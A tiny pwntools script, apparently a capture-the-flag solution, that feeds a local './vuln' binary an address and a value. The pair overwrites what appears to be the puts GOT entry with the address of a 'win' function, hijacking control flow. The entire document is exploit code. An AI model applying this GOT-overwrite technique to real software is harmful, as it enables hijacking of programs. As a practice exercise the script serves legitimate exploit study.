#coding=utf-8
from pwn import *

p = process('./vuln')

puts = 0x0804a01c
win = 0x080485c6

p.sendlineafter('Input address\n', str(puts))
p.sendlineafter('Input value?\n', str(win))
print p.recvall(1)
